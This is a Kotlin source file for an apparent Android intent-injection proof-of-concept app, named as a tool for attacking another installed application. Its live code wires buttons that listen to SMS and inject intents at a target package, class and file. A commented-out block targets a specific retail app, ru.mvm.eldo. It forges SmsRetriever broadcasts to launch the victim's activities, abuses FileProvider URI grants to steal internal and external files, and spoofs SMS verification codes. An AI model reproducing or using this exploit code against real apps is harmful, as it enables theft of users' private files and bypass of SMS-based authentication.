package bar.gtfo.intent_injector

import android.os.Bundle
import android.view.View
import android.widget.*
import android.widget.AdapterView.OnItemSelectedListener
import androidx.activity.ComponentActivity
import bar.gtfo.intent_injector.intent.IntentManager


class MainActivity : ComponentActivity() {

    private val intentManager = IntentManager(this)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        configureViews()
    }

    private fun configureViews() {
        findViewById<Button>(R.id.start_listen_to_sms_button).setOnClickListener {
            intentManager.startListenToSms()
        }

        findViewById<Button>(R.id.inject_button).setOnClickListener {
            intentManager.injectAccordingToMode()
        }

        findViewById<Button>(R.id.set_target_button).setOnClickListener {
            val packageName = findViewById<EditText>(R.id.package_name_edit_text).text.toString()
            val className = findViewById<EditText>(R.id.class_name_edit_text).text.toString()
            val fileName = findViewById<EditText>(R.id.file_name_edit_text).text.toString()
            intentManager.setTarget(packageName, className, fileName)
        }

        findViewById<Spinner>(R.id.mode_spinner)?.let { spinner ->
            spinner.adapter = ArrayAdapter<IntentManager.Mode>(
                this,
                android.R.layout.simple_list_item_1,
                IntentManager.Mode.values())
            spinner.onItemSelectedListener = object: OnItemSelectedListener {
                override fun onItemSelected(spinner: AdapterView<*>?, view: View?, position: Int, id: Long) {
                    spinner?.getItemAtPosition(position)?.let {
                        intentManager.setMode(it as IntentManager.Mode)
                    }
                }

                override fun onNothingSelected(view: AdapterView<*>?) {
                }
            }
        }
    }



/*
    fun stealExternalFile(view: View) {
        findViewById<EditText>(R.id.filenameEdit).text.toString().also {
            sendGrantReadPayload("content://ru.mvm.eldo.fileprovider/external_files/Android/data/ru.mvm.eldo/" + it)
        }
    }

    fun stealInternalFile(view: View) {
        findViewById<EditText>(R.id.filenameEdit).text.toString().also {
            sendGrantReadPayload("content://ru.mvm.eldo.im.threads.fileprovider/internal_files/" + it)
        }
    }

    fun sendGrantReadPayload(uri: String) {
        Intent().apply {
            flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
            setClassName(packageName, "bar.gtfo.mvde028_intent_injection_poc.MainActivity")
            data = Uri.parse(uri)
        }.also{
            sendSmsReceived(it)
        }
    }

    fun writeToFile(view: View) {
        filesDir.absolutePath.also {
            Toast.makeText(this, it, Toast.LENGTH_LONG).show()
        }
    }

    fun spoofSmsCode(view: View) {
        Intent().apply{
            setClassName("bar.gtfo.mvde028_intent_injection_poc", "bar.gtfo.mvde028_intent_injection_poc.SecondActivity")
            // setClassName("ru.mvm.eldo", "ru.mvm.eldo.presentation.splash.activity.SplashActivity")
            // putExtra("com.google.android.gms.auth.api.phone.EXTRA_SMS_MESSAGE", "You're pwned 6666")
            putExtra("ZALUPA", "PENIS")
        }.also {
            sendSmsReceived(it)
        }
    }

    fun startMainActivity(view: View) {
        Intent().apply {
            setClassName("ru.mvm.eldo", "ru.mvm.eldo.presentation.main.MainActivity")
        }.also {
            sendSmsReceived(it)
        }
    }

    fun startRegionActivity(view: View) {
        Intent().apply {
            setClassName("ru.mvm.eldo", "ru.mvm.eldo.presentation.region.activity.RegionActivity")
        }.also {
            sendSmsReceived(it)
        }
    }

    private fun sendSmsReceived(extra: Intent) {
        Intent().apply{
            action = SmsRetriever.SMS_RETRIEVED_ACTION
            putExtra(SmsRetriever.EXTRA_CONSENT_INTENT, extra)
            putExtra(SmsRetriever.EXTRA_STATUS, Status(CommonStatusCodes.SUCCESS))
        }.also {
            sendBroadcast(it)
        }

        // intent.setClassName("bar.gtfo.mvde028_intent_injection_poc", "bar.gtfo.mvde028_intent_injection_poc.SecondActivity")
        // intent.setClassName("ru.mvm.eldo", "ru.mvm.eldo.presentation.splash.activity.SplashActivity")

        // intent.action = "bar.gtfo.mvde028_intent_injection_poc.ZALUPA"

        // intent.putExtra("com.google.android.gms.auth.api.phone.EXTRA_STATUS", 15) // TIMEOUT
        // intent.putExtra("ZALUPA", "PENIS")
    }
        @SuppressLint("HardwareIds")
    fun showAndroidId(view: View) {
        Settings.Secure.getString(mainActivity.contentResolver, Settings.Secure.ANDROID_ID).also {
            Toast.makeText(mainActivity, it, Toast.LENGTH_LONG).show()
        }
    }

*/
}